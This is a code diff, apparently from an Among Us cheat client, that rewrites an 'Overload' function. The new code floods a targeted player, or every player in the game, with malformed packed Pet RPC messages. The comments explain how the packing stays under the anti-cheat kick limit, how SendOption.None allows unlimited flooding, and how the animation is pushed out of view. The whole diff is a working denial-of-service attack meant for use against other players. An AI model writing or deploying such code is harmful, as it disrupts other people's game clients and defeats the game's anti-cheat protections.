@@ -261,21 +261,90 @@ public static class Utils
         }
     }
 
-    // Overloads target with set strength using malformed RPCs
+    // Returns the max number of nested RPCs that can be in a GameData message
+    // without getting kicked by AC
+    public static int GetMaxRpcPackingLimit()
+    {
+        int num = 0;
+
+        if (isClient && AmongUsClient.Instance.AmHost)
+        {
+            num = GameManager.Instance.LogicOptions.MaxPlayers * 2;
+        }
+
+        return 10 + num;
+    }
+
+    // Overloads target with set strength using Pet RPCs that
+    // repeatedly restart the hand-petting animation, preventing old petting coroutines
+    // from resolving
     public static void Overload(int targetId, int strength)
     {
-        // ClimbLadder RPC is only effective in maps with no ladders or in lobby
-        // SetStartCounter RPC is only effective when NOT in lobby
+        if (strength < 1) return;
 
-        bool hasLadders = isShip && (isFungleMap || isAirshipMap);
+        int maxRpc = GetMaxRpcPackingLimit();
 
-        uint netId = hasLadders ? PlayerControl.LocalPlayer.NetId : PlayerControl.LocalPlayer.MyPhysics.NetId;
-        byte rpcCall = hasLadders ? (byte)RpcCalls.SetStartCounter : (byte)RpcCalls.ClimbLadder;
+        uint netId = PlayerControl.LocalPlayer.MyPhysics.NetId;
+        byte rpcCall = (byte)RpcCalls.Pet;
 
-        for (int i = 0; i < strength; i++) // Strength = Num of malformed RPCs sent
+        if (strength <= maxRpc)
         {
-            MessageWriter overloadMsg = AmongUsClient.Instance.StartRpcImmediately(netId, rpcCall, SendOption.None, targetId);
-            AmongUsClient.Instance.FinishRpcImmediately(overloadMsg);
+            // SendOption.None has no flow control, allowing for flooding without limits
+
+            var messageWriter = MessageWriter.Get(SendOption.None);
+
+            if (targetId < 0) // -1 = Broadcast
+            {
+                messageWriter.StartMessage(Tags.GameData);
+                messageWriter.Write(AmongUsClient.Instance.GameId);
+            }
+            else
+            {
+                messageWriter.StartMessage(Tags.GameDataTo);
+                messageWriter.Write(AmongUsClient.Instance.GameId);
+                messageWriter.WritePacked(targetId);
+            }
+
+            for (var msg = 0; msg < strength; msg++)
+            {
+                messageWriter.StartMessage((byte)GameDataTypes.RpcFlag);
+
+                messageWriter.WritePacked(netId);
+
+                messageWriter.Write(rpcCall);
+
+                // Use LocalPlayer.GetTruePosition() as the petting position
+                // to minimize WalkPlayerTo delay and start the hand-petting animation immediately
+
+                NetHelpers.WriteVector2(PlayerControl.LocalPlayer.GetTruePosition(), messageWriter);
+
+                // Pet position is decoded as (-50, -50) on target clients
+                // This keeps the hand-petting animation out of normal view
+
+                messageWriter.Write((ushort)0);
+
+                messageWriter.Write((ushort)0);
+
+                messageWriter.EndMessage();
+            }
+
+            messageWriter.EndMessage();
+
+            AmongUsClient.Instance.connection.Send(messageWriter);
+
+            messageWriter.Recycle();
+        }
+        else
+        {
+            int strengthGroups = strength / maxRpc;
+            int remainder = strength % maxRpc;
+
+            for (int group = 0; group < strengthGroups; group++)
+            {
+                Overload(targetId, maxRpc);
+            }
+
+            Overload(targetId, remainder);
         }
     }
 
